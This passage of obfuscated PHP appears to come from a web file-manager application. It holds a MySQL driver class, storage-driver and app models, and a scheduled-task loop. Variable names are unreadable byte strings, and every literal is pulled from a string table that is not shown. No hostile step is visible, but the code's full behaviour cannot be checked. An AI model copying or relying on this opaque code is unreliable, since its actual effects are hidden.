function execute($ß¤€¨…) { $†òîßŞ¡ =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ß¤€¨…; if ($this->queryID) { $this->free(); } think_action_status($†òîßŞ¡[35], 1); think_status($†òîßŞ¡[34]); $€¬Âúî = mysql_query($ß¤€¨…, $this->_linkID); $this->debug(); if (!1 === $€¬Âúî) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ˆûùúÊ¯][955], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $£Ùç©Å˜ = mysql_query($_SERVER[ˆûùúÊ¯][956], $this->_linkID); $this->transTimes = 0; if (!$£Ùç©Å˜) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $“Äë»ÃÛ = mysql_query($_SERVER[ˆûùúÊ¯][957], $this->_linkID); $this->transTimes = 0; if (!$“Äë»ÃÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ùø›ù¸á = array(); if ($this->numRows > 0) { while ($‡¡¦÷ù¡ = mysql_fetch_assoc($this->queryID)) { $Ùø›ù¸á[] = $‡¡¦÷ù¡; } mysql_data_seek($this->queryID, 0); } return $Ùø›ù¸á; } public function getFields($òÖ¬¯‰) { $’¶ûº›Û =& $_SERVER[ˆûùúÊ¯]; $Åë€³Ò = $this->query($’¶ûº›Û[958] . $this->parseKey($òÖ¬¯‰)); $™ãæÛ‡ = array(); if ($Åë€³Ò) { foreach ($Åë€³Ò as $«õ¼ü•İ => $å§şâÙ) { $™ãæÛ‡[$å§şâÙ[$’¶ûº›Û[41]]] = array($’¶ûº›Û[42] => $å§şâÙ[$’¶ûº›Û[41]], $’¶ûº›Û[43] => $å§şâÙ[$’¶ûº›Û[44]], $’¶ûº›Û[45] => (bool) (strtoupper($å§şâÙ[$’¶ûº›Û[46]]) === $’¶ûº›Û[959]), $’¶ûº›Û[47] => $å§şâÙ[$’¶ûº›Û[48]], $’¶ûº›Û[49] => strtolower($å§şâÙ[$’¶ûº›Û[50]]) == $’¶ûº›Û[51], $’¶ûº›Û[52] => strtolower($å§şâÙ[$’¶ûº›Û[53]]) == $’¶ûº›Û[54]); } } return $™ãæÛ‡; } public function getTables($™öÛ³Ú¿ = '') { $Æô‚úë =& $_SERVER[ˆûùúÊ¯]; if (!empty($™öÛ³Ú¿)) { $Ïšå±²í = $Æô‚úë[960] . $™öÛ³Ú¿ . $Æô‚úë[961]; } else { $Ïšå±²í = $Æô‚úë[962]; } $ñ¸ı¯Ä” = $this->query($Ïšå±²í); $Ø¬ı„›š = array(); foreach ($ñ¸ı¯Ä” as $„¼°¡Ü¨ => $Œ€ºÎ´ü) { $Ø¬ı„›š[$„¼°¡Ü¨] = current($Œ€ºÎ´ü); } return $Ø¬ı„›š; } public function replace($ˆš˜é¨Œ, $¤²¦À¿Ö = array()) { $—áäı« =& $_SERVER[ˆûùúÊ¯]; foreach ($ˆš˜é¨Œ as $Í”“¸öİ => $¢ê•ú¾î) { $£€ÌÎóë = $this->parseValue($¢ê•ú¾î); if (is_scalar($£€ÌÎóë)) { $ßÕÑå[] = $£€ÌÎóë; $‰†î™¸¦[] = $this->parseKey($Í”“¸öİ); } } $¥ëğĞ‚° = $—áäı«[963] . $this->parseTable($¤²¦À¿Ö[$—áäı«[331]]) . $—áäı«[964] . implode($—áäı«[60], $‰†î™¸¦) . $—áäı«[965] . implode($—áäı«[60], $ßÕÑå) . $—áäı«[966]; return $this->execute($¥ëğĞ‚°); } public function insertAll($€ıŒêÓÛ, $üşÑ§á = array(), $âîúãÔÅ = false) { $ªàºªèğ =& $_SERVER[ˆûùúÊ¯]; if (!is_array($€ıŒêÓÛ[0])) { return !1; } $ùç’¸Áâ = array_keys($€ıŒêÓÛ[0]); $ßƒÄ‹şƒ = array(); foreach ($€ıŒêÓÛ as $§ÄÜ£Õ–) { $ÈúµÍ  = array(); foreach ($§ÄÜ£Õ– as $±²ƒ€• => $Ş‘¶›°’) { $Ş‘¶›°’ = $this->parseValue($Ş‘¶›°’); if (is_scalar($Ş‘¶›°’)) { $ÈúµÍ [] = $Ş‘¶›°’; } } $ßƒÄ‹şƒ[] = $ªàºªèğ[312] . implode($ªàºªèğ[60], $ÈúµÍ ) . $ªàºªèğ[966]; } array_walk($ùç’¸Áâ, array($this, $ªàºªèğ[967])); $Ùƒæ™Å± = ($âîúãÔÅ ? $ªàºªèğ[968] : $ªàºªèğ[969]) . $ªàºªèğ[970] . $this->parseTable($üşÑ§á[$ªàºªèğ[331]]) . $ªàºªèğ[964] . implode($ªàºªèğ[60], $ùç’¸Áâ) . $ªàºªèğ[971] . implode($ªàºªèğ[60], $ßƒÄ‹şƒ); return $this->execute($Ùƒæ™Å±); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¶ûš‹çË =& $_SERVER[ˆûùúÊ¯]; $this->error = mysql_errno() . $¶ûš‹çË[4] . mysql_error($this->_linkID); if ($¶ûš‹çË[12] != $this->queryStr) { $this->error .= LNG($¶ûš‹çË[58]) . $this->queryStr; } think_trace($this->error, $¶ûš‹çË[12], $¶ûš‹çË[59]); return $this->error; } public function escapeString($»§Éº²õ) { if ($this->_linkID) { return mysql_real_escape_string($»§Éº²õ, $this->_linkID); } else { return mysql_escape_string($»§Éº²õ); } } public function parseKey(&$÷×Œ›í¡, $Ò¾ì¾£ß = true) { $ëåĞæ¾ë =& $_SERVER[ˆûùúÊ¯]; if ($Ò¾ì¾£ß) { $÷×Œ›í¡ = $this->parseKeyCheck($÷×Œ›í¡); } if ($÷×Œ›í¡ != $ëåĞæ¾ë[212] && !preg_match($ëåĞæ¾ë[972], $÷×Œ›í¡)) { $÷×Œ›í¡ = $ëåĞæ¾ë[437] . trim($÷×Œ›í¡, $ëåĞæ¾ë[437]) . $ëåĞæ¾ë[437]; } return $÷×Œ›í¡; } } goto AŞï¸¡šË¤; A³îÅ­¿ËŸ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x73\157\x75\162\x63\x65\x53\x65\x63\162\145\164\114\x69\x73\x74"; public $field = array("\x73\157\x75\162\x63\145\111\x44", "\x74\171\160\x65\x49\x44", "\143\162\x65\141\164\145\125\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\163\164\x6f\x72\141\147\145\114\151\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x69\172\145\115\x61\170", "\x73\x79\163\x74\145\155", "\144\x65\x66\141\x75\154\164", "\144\x72\x69\166\x65\x72", "\x63\x6f\156\x66\151\x67"); public function listData($ƒñ¥‡¥  = false, $‘ÎĞª = "\x6d\x6f\x64\151\146\171\124\x69\155\x65", $ŒşÆ»Ë = false) { $—…ƒâÅì =& $_SERVER[ˆûùúÊ¯]; $·‰›Ç² = parent::listData($ƒñ¥‡¥ , $‘ÎĞª, $ŒşÆ»Ë); if ($ƒñ¥‡¥ ) { return $·‰›Ç²; } $ñ»“¢ÈŒ = $this->ioSizeUseGet(array_to_keyvalue($·‰›Ç², $—…ƒâÅì[12], $—…ƒâÅì[451])); foreach ($·‰›Ç² as $úöŸŞ¥Â => $ş«»¤Áé) { unset($·‰›Ç²[$úöŸŞ¥Â][$—…ƒâÅì[6]]); $·‰›Ç²[$úöŸŞ¥Â][$—…ƒâÅì[1885]] = isset($ñ»“¢ÈŒ[$ş«»¤Áé[$—…ƒâÅì[451]]]) ? $ñ»“¢ÈŒ[$ş«»¤Áé[$—…ƒâÅì[451]]] : 0; } return $·‰›Ç²; } public function ioSizeUseGet($½×€äÂŠ) { $ÁÄß ÚÔ =& $_SERVER[ˆûùúÊ¯]; if (!$½×€äÂŠ) { return array(); } $ô“µ¢»  = $ÁÄß ÚÔ[2216] . implode($ÁÄß ÚÔ[60], $½×€äÂŠ); $ãÃ¡¸© = Cache::get($ô“µ¢» ); if ($ãÃ¡¸©) { return $ãÃ¡¸©; } $µ £êÓÂ = array($ÁÄß ÚÔ[877] => $ÁÄß ÚÔ[451], $ÁÄß ÚÔ[2217] => $ÁÄß ÚÔ[86]); $ŞïÃ•¶ü = array($ÁÄß ÚÔ[877] => array($ÁÄß ÚÔ[7], $½×€äÂŠ)); $ãÃ¡¸© = Model($ÁÄß ÚÔ[849])->field($µ £êÓÂ)->where($ŞïÃ•¶ü)->group($ÁÄß ÚÔ[877])->select(); $ãÃ¡¸© = array_to_keyvalue($ãÃ¡¸©, $ÁÄß ÚÔ[451], $ÁÄß ÚÔ[86]); Cache::set($ô“µ¢» , $ãÃ¡¸©, 600); return $ãÃ¡¸©; } public function getConfig($¹ÛÅÒëÉ) { $¤Öü³÷Ô = parent::listData($¹ÛÅÒëÉ); return json_decode($¤Öü³÷Ô[$_SERVER[ˆûùúÊ¯][6]], !0); } public function update($ÂÊ¯¯±‘, $ÁˆÜ°Ì‚) { $úîƒ÷ığ =& $_SERVER[ˆûùúÊ¯]; $çø€˜„ = $ÁˆÜ°Ì‚[$úîƒ÷ığ[42]]; $³şş¦‘Ï = array_to_keyvalue(parent::listData(), $úîƒ÷ığ[42]); if (isset($³şş¦‘Ï[$çø€˜„]) && $³şş¦‘Ï[$çø€˜„][$úîƒ÷ığ[451]] != $ÂÊ¯¯±‘) { return !1; } $this->checkPwd($ÂÊ¯¯±‘, $ÁˆÜ°Ì‚); if (isset($ÁˆÜ°Ì‚[$úîƒ÷ığ[2218]]) && $ÁˆÜ°Ì‚[$úîƒ÷ığ[2218]] == $úîƒ÷ığ[98]) { $this->checkConfig($ÁˆÜ°Ì‚); } unset($ÁˆÜ°Ì‚[$úîƒ÷ığ[2218]]); $†Íá¡ø = parent::update($ÂÊ¯¯±‘, $ÁˆÜ°Ì‚); if ($†Íá¡ø && $ÁˆÜ°Ì‚[$úîƒ÷ığ[47]]) { $Ï¸³‚Å¥ = 0; foreach ($³şş¦‘Ï as $İöÆÓ»ı) { if ($İöÆÓ»ı[$úîƒ÷ığ[47]] && $İöÆÓ»ı[$úîƒ÷ığ[451]] != $ÂÊ¯¯±‘) { $Ï¸³‚Å¥ = $İöÆÓ»ı[$úîƒ÷ığ[451]]; parent::update($İöÆÓ»ı[$úîƒ÷ığ[451]], array($úîƒ÷ığ[47] => 0)); } } $this->updateBackup($ÂÊ¯¯±‘, $Ï¸³‚Å¥); } return $†Íá¡ø; } public function add($¢ÃÏşÃ) { $ÇìÚ»‹¬ =& $_SERVER[ˆûùúÊ¯]; $Œº¨à“… = array_to_keyvalue(parent::listData(), $ÇìÚ»‹¬[42]); if (isset($Œº¨à“…[$¢ÃÏşÃ[$ÇìÚ»‹¬[42]]])) { return !1; } $this->checkConfig($¢ÃÏşÃ); $‘€à÷ã = parent::insert($¢ÃÏşÃ); if ($‘€à÷ã && $¢ÃÏşÃ[$ÇìÚ»‹¬[47]]) { foreach ($Œº¨à“… as $€±´²†…) { if ($€±´²†…[$ÇìÚ»‹¬[47]]) { parent::update($€±´²†…[$ÇìÚ»‹¬[451]], array($ÇìÚ»‹¬[47] => 0)); } } } return $‘€à÷ã; } public function updateBackup($¸ı¨‚£, $¿¤ñºİÎ) { $£¢á¥¬î =& $_SERVER[ˆûùúÊ¯]; if (!$¿¤ñºİÎ) { return; } $µÀ„«È½ = Model($£¢á¥¬î[809])->config(); if ($µÀ„«È½[$£¢á¥¬î[1674]] != $£¢á¥¬î[98] || $µÀ„«È½[$£¢á¥¬î[811]] != $¿¤ñºİÎ) { return; } $íìÓÚÁÊ = Model($£¢á¥¬î[830])->get($£¢á¥¬î[840]); $íìÓÚÁÊ = json_decode($íìÓÚÁÊ, !0); if (!$íìÓÚÁÊ) { return; } $íìÓÚÁÊ[$£¢á¥¬î[811]] = $¸ı¨‚£; Model($£¢á¥¬î[830])->set(array($£¢á¥¬î[840] => $íìÓÚÁÊ)); } public function checkPwd($‘Äğ¬Ì, &$–ØÂÅæ¬) { $­«Ó²÷ç =& $_SERVER[ˆûùúÊ¯]; if (empty($–ØÂÅæ¬[$­«Ó²÷ç[6]])) { return; } $¶Ÿå¨’ø = json_decode($–ØÂÅæ¬[$­«Ó²÷ç[6]], !0); $™ŠÒŸœ = $­«Ó²÷ç[12]; $œÓä§„« = array($­«Ó²÷ç[2219], $­«Ó²÷ç[2220], $­«Ó²÷ç[950]); foreach ($œÓä§„« as $é³åİ) { if (isset($¶Ÿå¨’ø[$é³åİ])) { $™ŠÒŸœ = $é³åİ; break; } } if (!$™ŠÒŸœ) { return; } $¿¾¡àÉ” = $this->getConfig($‘Äğ¬Ì); $æóÑşıı = $¿¾¡àÉ”[$™ŠÒŸœ]; $©Í”—İº = $¶Ÿå¨’ø[$™ŠÒŸœ]; if ($©Í”—İº == str_repeat($­«Ó²÷ç[212], strlen($æóÑşıı))) { $¶Ÿå¨’ø[$™ŠÒŸœ] = $æóÑşıı; $–ØÂÅæ¬[$­«Ó²÷ç[6]] = json_encode($¶Ÿå¨’ø); } else { if ($©Í”—İº != $æóÑşıı) { $–ØÂÅæ¬[$­«Ó²÷ç[2218]] = $­«Ó²÷ç[98]; } } } public function checkConfig(&$›»šëˆ, $¤œ³ä™Î = false) { $Áí¬’‹Õ =& $_SERVER[ˆûùúÊ¯]; $î¿Ú†İÎ = strtolower($›»šëˆ[$Áí¬’‹Õ[105]]); $Ëöéé‚ = json_decode($›»šëˆ[$Áí¬’‹Õ[6]], !0); foreach ($Ëöéé‚ as $¦ƒ«•»£ => $ß¨×Ç‘) { if (is_string($ß¨×Ç‘)) { $Ëöéé‚[$¦ƒ«•»£] = trim($ß¨×Ç‘); } } $Ëöéé‚[$Áí¬’‹Õ[2221]] = rand_string(6); $…“š„ = $GLOBALS[$Áí¬’‹Õ[6]][$Áí¬’‹Õ[99]][$Áí¬’‹Õ[886]]; $Ç€÷È° = isset($…“š„[$î¿Ú†İÎ]) ? $…“š„[$î¿Ú†İÎ] : ucfirst($î¿Ú†İÎ); $€ïœ”á€ = $Áí¬’‹Õ[84] . $Ç€÷È°; if (!$Ç€÷È° || !class_exists($€ïœ”á€)) { if ($¤œ³ä™Î) { return LNG($Áí¬’‹Õ[2222]); } write_log(array($Áí¬’‹Õ[2223], $›»šëˆ, get_caller_info()), $Áí¬’‹Õ[2224]); show_json(LNG($Áí¬’‹Õ[2222]), !1, $›»šëˆ); } $ØÕç¦¸¦ = new $€ïœ”á€($Ëöéé‚); if (in_array($î¿Ú†İÎ, $ØÕç¦¸¦->objectDriver)) { if (!$ØÕç¦¸¦->isBucketCors() && !$ØÕç¦¸¦->setBucketCors()) { $Ÿˆ°ô¸Ç = LNG($Áí¬’‹Õ[2225]); $Ÿˆ°ô¸Ç .= $Áí¬’‹Õ[2226] . LNG($Áí¬’‹Õ[2227]); if ($¤œ³ä™Î) { return $Ÿˆ°ô¸Ç; } show_json($Ÿˆ°ô¸Ç, !1); } } $¼í¼ë¬ = rtrim($Ëöéé‚[$Áí¬’‹Õ[1241]], $Áí¬’‹Õ[8]) . $Áí¬’‹Õ[8]; $”ğÜ¤¼À = $ØÕç¦¸¦->getPath($¼í¼ë¬ . $Áí¬’‹Õ[1245]); if (!$ØÕç¦¸¦->mkfile($”ğÜ¤¼À)) { if ($¤œ³ä™Î) { return LNG($Áí¬’‹Õ[2225]); } show_json(LNG($Áí¬’‹Õ[2225]), !1); } $Ëöéé‚[$Áí¬’‹Õ[1241]] = $¼í¼ë¬; $›»šëˆ[$Áí¬’‹Õ[6]] = json_encode($Ëöéé‚); $›»šëˆ[$Áí¬’‹Õ[105]] = $Ç€÷È°; return !0; } public function driverListSystem() { $µ¸¥Î =& $_SERVER[ˆûùúÊ¯]; $ğÙ®ç¾µ = parent::listData(); $ğ©‡˜ü‚ = array(); foreach ($ğÙ®ç¾µ as $ªèš½ Û) { unset($ªèš½ Û[$µ¸¥Î[224]], $ªèš½ Û[$µ¸¥Î[95]]); $ªèš½ Û[$µ¸¥Î[6]] = json_decode($ªèš½ Û[$µ¸¥Î[6]], !0); $ğ©‡˜ü‚[] = $ªèš½ Û; } return $ğ©‡˜ü‚; } public function defaultDriver() { $Ø€®‹Éä =& $_SERVER[ˆûùúÊ¯]; $¬÷‚Æ·¹ = parent::listData(); $âŞ«ªÉÏ = array_filter_by_field($¬÷‚Æ·¹, $Ø€®‹Éä[47], 1); $âŞ«ªÉÏ = $âŞ«ªÉÏ[0]; if ($âŞ«ªÉÏ) { $âŞ«ªÉÏ[$Ø€®‹Éä[6]] = json_decode($âŞ«ªÉÏ[$Ø€®‹Éä[6]], !0); } return $âŞ«ªÉÏ; } public function driverInfo($à±Ğ¯»Ä) { $ÆÊç¶ğ =& $_SERVER[ˆûùúÊ¯]; $ŒŸ·Ç¹ = array_to_keyvalue(parent::listData(), $ÆÊç¶ğ[451]); if (!isset($ŒŸ·Ç¹[$à±Ğ¯»Ä])) { return !1; } $³Âèªş§ = $ŒŸ·Ç¹[$à±Ğ¯»Ä]; $³Âèªş§[$ÆÊç¶ğ[6]] = json_decode($³Âèªş§[$ÆÊç¶ğ[6]], !0); return $³Âèªş§; } public function remove($òÇı½ ) { $this->removeShareItems($òÇı½ ); return parent::remove($òÇı½ ); } public function removeWithFile($¨Ä§ñƒù, $”ÏëÇæë) { $Ëİ”®‚ô =& $_SERVER[ˆûùúÊ¯]; $ì†¤¾¾İ = array($Ëİ”®‚ô[877] => $¨Ä§ñƒù); $…ÇëÀ§ª = Model($Ëİ”®‚ô[520])->where($ì†¤¾¾İ)->count(); $¯Å¸µ¶ = Model($Ëİ”®‚ô[520])->where($ì†¤¾¾İ)->sum($Ëİ”®‚ô[86]); $…äÇ´… = $”ÏëÇæë . $Ëİ”®‚ô[2228] . $¨Ä§ñƒù; $è®•Õ÷ = LNG($”ÏëÇæë == $Ëİ”®‚ô[596] ? $Ëİ”®‚ô[2229] : $Ëİ”®‚ô[2230]); $Õ›êä·Î = new TaskFileTransfer($…äÇ´…, $Ëİ”®‚ô[2224], $…ÇëÀ§ª, $è®•Õ÷ . "\50{$¨Ä§ñƒù}\51"); $Õ›êä·Î->task[$Ëİ”®‚ô[823]] = (double) $¯Å¸µ¶; $‹Š¸Ïª³ = KodIO::defaultDriver(); $ğ¸Ì™ŞÄ = $‹Š¸Ïª³[$Ëİ”®‚ô[451]]; $ÈüÅŸ›‘ = "\x7b\151\157\x3a{$ğ¸Ì™ŞÄ}\175\57"; $æúÑ£ª = !0; $’«‚¼Ğô = array(); $Ç ¼¾ÚŸ = Model($Ëİ”®‚ô[223])->where($ì†¤¾¾İ)->field($Ëİ”®‚ô[2231])->select(); foreach ($Ç ¼¾ÚŸ as $°åš¡Ëë) { $–ıÆ¶€² = $°åš¡Ëë[$Ëİ”®‚ô[94]]; $ÕÏ†‘ìŸ = $ÈüÅŸ›‘ . str_replace("\x7b\x69\157\72{$¨Ä§ñƒù}\x7d\x2f", $Ëİ”®‚ô[12], $–ıÆ¶€²); if (!IO::exist($–ıÆ¶€²)) { $’«‚¼Ğô[] = $°åš¡Ëë[$Ëİ”®‚ô[517]]; $Õ›êä·Î->updateFileEnd($°åš¡Ëë[$Ëİ”®‚ô[42]], $°åš¡Ëë[$Ëİ”®‚ô[86]]); continue; } if (IO::exist($ÕÏ†‘ìŸ)) { $Õ›êä·Î->updateFileEnd($°åš¡Ëë[$Ëİ”®‚ô[42]], $°åš¡Ëë[$Ëİ”®‚ô[86]]); continue; } if (!IO::move($–ıÆ¶€², get_path_father($ÕÏ†‘ìŸ))) { $æúÑ£ª = !1; break; } $ì†¤¾¾İ = array($Ëİ”®‚ô[517] => $°åš¡Ëë[$Ëİ”®‚ô[517]]); $²æÃ¤½¯ = array($Ëİ”®‚ô[877] => $ğ¸Ì™ŞÄ, $Ëİ”®‚ô[94] => $ÕÏ†‘ìŸ); Model($Ëİ”®‚ô[223])->where($ì†¤¾¾İ)->save($²æÃ¤½¯); } $this->removeByFileID($’«‚¼Ğô); if (!$æúÑ£ª) { $Õ›êä·Î->stop($…äÇ´…); return !1; } $Õ›êä·Î->end(); if ($”ÏëÇæë == $Ëİ”®‚ô[1865]) { $this->remove($¨Ä§ñƒù); } } public function progress($ë—¯š³, $ÃØƒæØÃ) { return Task::get($ÃØƒæØÃ . $_SERVER[ˆûùúÊ¯][2228] . $ë—¯š³); } private function removeByFileID($–¤Ï›ˆ = array()) { $¾ã«åª =& $_SERVER[ˆûùúÊ¯]; if (empty($–¤Ï›ˆ)) { return; } $Õ­şŒÑ = array($¾ã«åª[517] => array($¾ã«åª[7], $–¤Ï›ˆ)); $Õ²éØ†ù = Model($¾ã«åª[1393])->where($Õ­şŒÑ)->field($¾ã«åª[190])->select(); if (!$Õ²éØ†ù) { return; } $Õ²éØ†ù = array_to_keyvalue($Õ²éØ†ù, $¾ã«åª[12], $¾ã«åª[190]); foreach ($Õ²éØ†ù as $ŒáÄıÛş) { Model($¾ã«åª[466])->removeNow($ŒáÄıÛş, !1); } } private function removeShareItems($ûš›ıÇÄ) { $ŞÂ’¹¬½ =& $_SERVER[ˆûùúÊ¯]; $Õ“»¿»€ = "\x7b\151\157\x3a{$ûš›ıÇÄ}\x7d\x2f"; $¶Ñ÷®£¸ = array($ŞÂ’¹¬½[190] => 0, $ŞÂ’¹¬½[1236] => array($ŞÂ’¹¬½[435], "{$Õ“»¿»€}\x25")); $æ®Âê¿İ = Model($ŞÂ’¹¬½[1876])->where($¶Ñ÷®£¸)->field($ŞÂ’¹¬½[641])->select(); if (empty($æ®Âê¿İ)) { return; } $Å±ÎİÁ» = array_to_keyvalue($æ®Âê¿İ, $ŞÂ’¹¬½[12], $ŞÂ’¹¬½[641]); Model($ŞÂ’¹¬½[640])->remove($Å±ÎİÁ»); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\114\x69\x67\x68\164\x41\x70\x70"; public $modelType = "\123\x79\x73\x74\x65\155\117\x70\x74\151\157\x6e"; public $field = array("\x6e\x61\x6d\x65", "\147\162\157\x75\x70", "\x64\x65\163\143", "\x63\x6f\156\x74\145\x6e\x74"); public function listData($¢™Ë³Ÿ = false, $ˆÛ¬úì¿ = "\155\x6f\x64\151\x66\171\124\151\155\x65", $Õïãº®• = true) { return parent::listData($¢™Ë³Ÿ, $ˆÛ¬úì¿, $Õïãº®•); } public function remove($¨ß¯˜Ñó) { $È¦À½ØÈ = $this->findByName($¨ß¯˜Ñó); if (!$È¦À½ØÈ) { return !1; } return parent::remove($È¦À½ØÈ[$_SERVER[ˆûùúÊ¯][451]]); } public function add($Í»°•é) { if ($this->findByName($Í»°•é[$_SERVER[ˆûùúÊ¯][42]])) { return !1; } return parent::insert($Í»°•é); } public function update($¡ø³„©, $²ª¡¶Ñœ) { $Î«Îûà• =& $_SERVER[ˆûùúÊ¯]; $ìÍéÉë = $this->findByName($¡ø³„©); $¡Å±¦¡ = $this->findByName($²ª¡¶Ñœ[$Î«Îûà•[42]]); if (!$ìÍéÉë || $¡Å±¦¡ && $¡Å±¦¡[$Î«Îûà•[451]] != $ìÍéÉë[$Î«Îûà•[451]]) { return !1; } return parent::update($ìÍéÉë[$Î«Îûà•[451]], $²ª¡¶Ñœ); } } goto f¦Êã¤¬¬; cÎËîğ¢ÑÅ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ƒ–éŞ­ =& $_SERVER[ˆûùúÊ¯]; if (self::valueGet($ƒ–éŞ­[810]) != $ƒ–éŞ­[98]) { return; } if (self::valueGet($ƒ–éŞ­[1660]) == $ƒ–éŞ­[98]) { $öã¤Ç¶Õ = self::valueGet($ƒ–éŞ­[1661]); if (time() - $öã¤Ç¶Õ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ƒ–éŞ­[1660], $ƒ–éŞ­[98]); self::log($ƒ–éŞ­[1662] . ACTION . $ƒ–éŞ­[1663]); Hook::bind($ƒ–éŞ­[1664], $ƒ–éŞ­[1665]); $ªÆÛÊÜç = 0; while (!0) { self::cacheClear(); if (self::valueGet($ƒ–éŞ­[810]) != $ƒ–éŞ­[98]) { self::valueSet($ƒ–éŞ­[1660], $ƒ–éŞ­[221]); self::log($ƒ–éŞ­[1666]); die; } $ÅíôØË = time(); if ($ÅíôØË - $ªÆÛÊÜç >= 60) { self::valueSet(array($ƒ–éŞ­[1660] => $ƒ–éŞ­[98], $ƒ–éŞ­[1661] => $ÅíôØË), !1); $ªÆÛÊÜç = $ÅíôØË; } if (!file_exists(USER_SYSTEM . $ƒ–éŞ­[1667])) { self::valueSet(array($ƒ–éŞ­[1660] => $ƒ–éŞ­[221], $ƒ–éŞ­[810] => $ƒ–éŞ­[221]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $°ÎÙĞ’Á =& $_SERVER[ˆûùúÊ¯]; http_close(); $GLOBALS[$°ÎÙĞ’Á[1668]] = 1; $_SERVER[$°ÎÙĞ’Á[1669]] = $°ÎÙĞ’Á[1670]; $_COOKIE = array(); $GLOBALS[$°ÎÙĞ’Á[544]] = 1; $GLOBALS[$°ÎÙĞ’Á[1671]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Íè’£¶ =& $_SERVER[ˆûùúÊ¯]; http_close(); self::valueSet($Íè’£¶[810], $Íè’£¶[221]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Íè’£¶[1660] => $Íè’£¶[221], $Íè’£¶[810] => $Íè’£¶[98]), !1); } public static function taskSwitch() { $ùÑËí° =& $_SERVER[ˆûùúÊ¯]; $ÒÒ›µÕÁ = self::valueGet($ùÑËí°[810]) == $ùÑËí°[98] ? $ùÑËí°[221] : $ùÑËí°[98]; self::valueSet($ùÑËí°[810], $ÒÒ›µÕÁ); } public static function shutdownEvent() { $‡ê³£º¸ =& $_SERVER[ˆûùúÊ¯]; self::valueSet($‡ê³£º¸[1660], $‡ê³£º¸[221]); self::log($‡ê³£º¸[1672]); } public static function config($ò€¸¬ñ‰, $·•çôÂÊ) { self::valueSet($_SERVER[ˆûùúÊ¯][810], $ò€¸¬ñ‰); } private static function taskRunAll() { $¾û§ĞÅ‚ =& $_SERVER[ˆûùúÊ¯]; $§ÚÜ†¼¥ = timeFloat(); $İå¿¬Ñ– = Model($¾û§ĞÅ‚[1673])->listData(); $¤Ü¹¹¢ä = count($İå¿¬Ñ–); for ($ëº´ËËÃ = 0; $ëº´ËËÃ < $¤Ü¹¹¢ä; $ëº´ËËÃ++) { $°Ÿ‚‹ø = $İå¿¬Ñ–[$ëº´ËËÃ]; if (!$°Ÿ‚‹ø[$¾û§ĞÅ‚[451]] || $°Ÿ‚‹ø[$¾û§ĞÅ‚[1674]] != $¾û§ĞÅ‚[98]) { continue; } if (!self::taskTimeCheck($°Ÿ‚‹ø)) { continue; } self::taskRun($°Ÿ‚‹ø); } Hook::trigger($¾û§ĞÅ‚[1675]); self::taskQueueRun($§ÚÜ†¼¥); } private static function taskQueueRun($‹ƒ»È¬ú) { $éò²¼ÇÇ = 10; while (!0) { $Šªµ›Ÿğ = TaskQueue::run(); if ($Šªµ›Ÿğ === !1) { break; } if (timeFloat() - $‹ƒ»È¬ú >= $éò²¼ÇÇ) { break; } } } private static function taskTimeCheck($ş§ˆ„Êê) { $õš¢ÂŠ =& $_SERVER[ˆûùúÊ¯]; $Ğí÷îğú = json_decode($ş§ˆ„Êê[$õš¢ÂŠ[203]], !0); $ÃìÇ®–ú = intval($ş§ˆ„Êê[$õš¢ÂŠ[1661]]); $ÁŸ‘ßÏª = strtotime($õš¢ÂŠ[1676] . $Ğí÷îğú[$õš¢ÂŠ[1677]] . $õš¢ÂŠ[1678]) - strtotime($õš¢ÂŠ[1679]); $ùÛşœœß = time() - strtotime(date($õš¢ÂŠ[1680]) . $õš¢ÂŠ[1681]); $ù’²ƒÃñ = $ùÛşœœß >= $ÁŸ‘ßÏª && $ùÛşœœß <= $ÁŸ‘ßÏª + 3600; switch ($Ğí÷îğú[$õš¢ÂŠ[43]]) { case $õš¢ÂŠ[1682]: if (time() - $ÃìÇ®–ú < 3600 * 24 * 30) { return !1; } if ($Ğí÷îğú[$õš¢ÂŠ[1682]] == date($õš¢ÂŠ[1683]) && $ù’²ƒÃñ) { return !0; } break; case $õš¢ÂŠ[1684]: if (time() - $ÃìÇ®–ú < 3600 * 24 * 7) { return !1; } $‹ƒÚô‰­ = date($õš¢ÂŠ[1685]) == 0 ? 7 : date($õš¢ÂŠ[1685]); if ($Ğí÷îğú[$õš¢ÂŠ[1684]] == $‹ƒÚô‰­ && $ù’²ƒÃñ) { return !0; } break; case $õš¢ÂŠ[1677]: if (time() - $ÃìÇ®–ú < 3600 * 24) { return !1; } if ($ù’²ƒÃñ) { return !0; } break; case $õš¢ÂŠ[1686]: if (time() - $ÃìÇ®–ú >= floatval($Ğí÷îğú[$õš¢ÂŠ[1686]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $÷¢®Ëî =& $_SERVER[ˆûùúÊ¯]; static $ÓõõÙ¥Ñ = 0; $ÙñëÆ¬ = 300; if (!$ÓõõÙ¥Ñ) { $ÓõõÙ¥Ñ = time(); } if (time() - $ÓõõÙ¥Ñ < $ÙñëÆ¬) { return; } $ÓõõÙ¥Ñ = time(); $Ş‰…´éï = Model($÷¢®Ëî[554])->db($÷¢®Ëî[12]); if ($Ş‰…´éï) { $Ş‰…´éï->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($÷¢®Ëî[1687], 